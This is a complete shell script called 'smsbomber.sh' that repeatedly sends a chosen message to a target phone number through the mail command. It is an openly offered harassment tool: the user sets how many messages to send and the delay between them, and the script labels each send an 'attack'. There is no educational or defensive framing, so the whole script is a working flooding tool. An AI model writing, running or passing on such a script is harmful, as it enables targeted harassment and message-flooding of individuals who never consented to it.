#Begin Script

#!/bin/sh
echo Please, enter your number
read NUMBER
echo	 Please, enter your short message
read MESSAGE
echo "Attacking $NUMBER"
echo Continue????? yes/no
read NEXT
if [ "$NEXT" = "no" ]; then
echo " Restarting"
./smsbomber.sh
elif [ "$NEXT" = "yes" ]; then
echo $MESSAGE > 1.txt
echo "How many sms messages to send"
read SMS
echo "Number of seconds between messages"
read speed
		 COUNTER=0
		 until [ $SMS
-le $COUNTER ]; do
		 cat 1.txt | mail -s "SMSBomber" $NUMBER
		 sleep $speed
			COUNTER=$(( $COUNTER + 1 ))
		 echo "Attack $COUNTER of $SMS"
echo "Crtl+c to call off attack"
done
fi

#End Script

